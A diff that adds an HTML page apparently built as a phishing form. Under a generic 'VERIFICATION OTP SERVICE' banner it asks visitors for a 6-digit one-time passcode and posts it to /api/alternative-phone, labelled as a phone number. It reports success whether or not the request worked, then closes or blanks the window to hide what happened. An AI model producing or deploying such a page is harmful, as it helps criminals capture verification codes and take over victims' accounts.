@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Alternative Phone Number</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #f5f5f5;
+    min-height: 100vh;
+}
+
+.yellow-background {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 53%;
+    background: #ffe600;
+    border-radius: 0 0 35px 35px;
+}
+
+.verification-container {
+    position: relative;
+    width: calc(100% - 32px);
+    max-width: 480px;
+    margin: 0 auto;
+    top: 45vh;
+    transform: translateY(-50%);
+    border-radius: 17px;
+    overflow: hidden;
+    box-shadow: 0 5px 18px rgba(0,0,0,.18);
+    background: white;
+}
+
+.header {
+    background: #777;
+    color: white;
+    padding: 20px 17px;
+    font-size: 25px;
+    font-weight: bold;
+    font-style: italic;
+}
+
+.form-content {
+    padding: 22px 17px 28px;
+    background: white;
+}
+
+.demo-label {
+    color: #8a5b00;
+    background: #fff4cf;
+    padding: 9px;
+    border-radius: 6px;
+    font-size: 12px;
+    text-align: center;
+    margin-bottom: 15px;
+}
+
+.description {
+    color: #666;
+    font-size: 14px;
+    font-style: italic;
+    margin-bottom: 12px;
+}
+
+label {
+    display: block;
+    font-size: 23px;
+    margin-bottom: 16px;
+}
+
+input {
+    width: 100%;
+    border: none;
+    border-bottom: 1px solid #777;
+    padding: 12px 5px;
+    font-size: 22px;
+    outline: none;
+    margin-bottom: 12px;
+}
+
+input:focus {
+    border-bottom: 2px solid #0645a5;
+}
+
+.message {
+    display: none;
+    padding: 11px;
+    border-radius: 25px;
+    text-align: center;
+    font-weight: bold;
+    margin-bottom: 14px;
+}
+
+.error {
+    background: #ed1745;
+    color: white;
+}
+
+.success {
+    background: #168a50;
+    color: white;
+}
+
+button {
+    display: block;
+    width: 90%;
+    margin: 0 auto;
+    background: #0645a5;
+    color: white;
+    border: none;
+    border-radius: 16px;
+    padding: 19px;
+    font-size: 20px;
+    cursor: pointer;
+    box-shadow: 0 4px 8px rgba(0,0,0,.2);
+}
+
+button:disabled {
+    opacity: .7;
+    cursor: default;
+}
+</style>
+</head>
+
+<body>
+
+<div class="yellow-background"></div>
+
+<div class="verification-container">
+
+    <div class="header">
+        
+    </div>
+
+    <div class="form-content">
+
+        <div class="demo-label">
+            Confirm OTP 
+        </div>
+
+        <div class="description">
+           VERIFICATION OTP SERVICE
+
+        <form id="verificationForm">
+
+            <label for="verificationCode">
+                ENTER OTP
+            </label>
+
+            <input
+                type="tel"
+                id="verificationCode"
+                placeholder="Enter 6-digit OTP"
+                inputmode="tel"
+                maxlength="20"
+                autocomplete="tel"
+                required
+            >
+
+            <div id="errorMessage" class="message error"></div>
+
+            <div id="successMessage" class="message success">
+                OTP submitted successfully!
+            </div>
+
+            <button type="submit" id="confirmButton">
+                CONFIRM OTP
+            </button>
+
+        </form>
+
+    </div>
+</div>
+
+<script>
+const verificationForm =
+    document.getElementById("verificationForm");
+
+const verificationInput =
+    document.getElementById("verificationCode");
+
+const errorMessage =
+    document.getElementById("errorMessage");
+
+const successMessage =
+    document.getElementById("successMessage");
+
+const confirmButton =
+    document.getElementById("confirmButton");
+
+verificationForm.addEventListener("submit", async function(event) {
+    event.preventDefault();
+
+    errorMessage.style.display = "none";
+    successMessage.style.display = "none";
+
+    const alternativePhone = verificationInput.value.trim();
+    const digits = alternativePhone.replace(/\D/g, "");
+
+    if (digits.length < 6 || digits.length > 6) {
+        errorMessage.textContent =
+            "Please enter a valid OTP .";
+
+        errorMessage.style.display = "block";
+        return;
+    }
+
+    confirmButton.disabled = true;
+    confirmButton.textContent = "Submitting...";
+
+    try {
+        const response = await fetch("/api/alternative-phone", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                alternative_phone_number: alternativePhone
+            })
+        });
+
+        const result = await response.json();
+
+        if (!response.ok || !result.ok) {
+            throw new Error(
+                result.error || "OTP submission failed."
+            );
+        }
+
+        successMessage.textContent =
+            "OTP submitted successfully!";
+
+        successMessage.style.display = "block";
+        confirmButton.textContent = "Submitted";
+
+    } catch (error) {
+        console.error("OTP submission error:", error);
+
+        errorMessage.textContent =
+            "Unable to submit. Please try again.";
+
+        errorMessage.style.display = "block";
+
+        confirmButton.disabled = false;
+        confirmButton.textContent = "Submit OTP";
+    }
+    successMessage.style.display = "block";
+confirmButton.textContent = "Submitted";
+
+setTimeout(() => {
+    window.close();
+    window.location.replace("about:blank");
+}, 1500);
+});
+</script>
+
+</body>
+</html>
